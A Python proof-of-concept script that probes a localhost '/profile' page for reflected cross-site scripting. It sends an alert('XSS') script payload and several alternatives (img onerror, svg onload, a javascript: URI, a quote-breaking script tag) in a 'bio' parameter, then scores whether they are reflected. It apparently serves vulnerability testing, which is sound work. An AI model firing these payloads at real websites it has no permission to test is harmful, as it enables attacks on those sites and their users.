#!/usr/bin/env python3
import requests
import json
import sys

def exploit():
    # Vulnerability details
    vuln_id = "profile-xss-bio"
    target_url = "http://localhost:3000"
    
    # Test payload for XSS detection
    xss_payload = "<script>alert('XSS')</script>"
    
    # Alternative payloads to test if the first one doesn't work
    alternative_payloads = [
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<svg onload=alert('XSS')>",
        "'\"><script>alert('XSS')</script>"
    ]
    
    results = {
        "vulnerability_id": vuln_id,
        "target_url": target_url,
        "test_endpoint": "/profile",
        "vulnerability_found": False,
        "confidence": "low",
        "details": [],
        "error": None
    }
    
    try:
        # Test the primary payload
        test_url = f"{target_url}/profile"
        params = {"bio": xss_payload}
        
        # Send GET request with XSS payload in bio parameter
        response = requests.get(test_url, params=params, timeout=10)
        
        # Check if payload is reflected in response
        payload_reflected = xss_payload in response.text
        
        # Check for common XSS indicators in response
        xss_indicators = [
            "<script>alert('XSS')</script>",
            "alert('XSS')",
            "<script>",
            "javascript:"
        ]
        
        indicators_found = []
        for indicator in xss_indicators:
            if indicator in response.text:
                indicators_found.append(indicator)
        
        # Document the test result
        test_result = {
            "payload": xss_payload,
            "url": response.url,
            "status_code": response.status_code,
            "payload_reflected": payload_reflected,
            "indicators_found": indicators_found,
            "response_length": len(response.text)
        }
        
        results["details"].append(test_result)
        
        # Test alternative payloads if primary test shows promise
        if payload_reflected or indicators_found:
            for alt_payload in alternative_payloads:
                try:
                    alt_params = {"bio": alt_payload}
                    alt_response = requests.get(test_url, params=alt_params, timeout=10)
                    
                    alt_reflected = alt_payload in alt_response.text
                    alt_indicators = []
                    
                    for indicator in ["alert('XSS')", "onerror=", "onload=", "<script>", "<svg", "<img"]:
                        if indicator in alt_response.text:
                            alt_indicators.append(indicator)
                    
                    alt_result = {
                        "payload": alt_payload,
                        "url": alt_response.url,
                        "status_code": alt_response.status_code,
                        "payload_reflected": alt_reflected,
                        "indicators_found": alt_indicators,
                        "response_length": len(alt_response.text)
                    }
                    
                    results["details"].append(alt_result)
                    
                    # Update main results if vulnerability confirmed
                    if alt_reflected and alt_indicators:
                        indicators_found.extend(alt_indicators)
                        
                except requests.RequestException:
                    # Continue testing other payloads if one fails
                    continue
        
        # Determine if vulnerability exists based on findings
        if payload_reflected and indicators_found:
            results["vulnerability_found"] = True
            results["confidence"] = "high"
        elif payload_reflected:
            results["vulnerability_found"] = True
            results["confidence"] = "medium"
        elif any(detail["payload_reflected"] for detail in results["details"]):
            results["vulnerability_found"] = True
            results["confidence"] = "medium"
        
        # Additional checks for response headers that might indicate filtering
        security_headers = {}
        for header in ["X-XSS-Protection", "Content-Security-Policy", "X-Content-Type-Options"]:
            if header in response.headers:
                security_headers[header] = response.headers[header]
        
        if security_headers:
            results["security_headers"] = security_headers
            if results["confidence"] == "high":
                results["confidence"] = "medium"  # Lower confidence if security headers present
    
    except requests.exceptions.ConnectionError:
        results["error"] = "Connection failed - target server may be down"
    except requests.exceptions.Timeout:
        results["error"] = "Request timeout - server did not respond in time"
    except requests.exceptions.RequestException as e:
        results["error"] = f"Request failed: {str(e)}"
    except Exception as e:
        results["error"] = f"Unexpected error: {str(e)}"
    
    return results

if __name__ == "__main__":
    result = exploit()
    print(json.dumps(result, indent=2))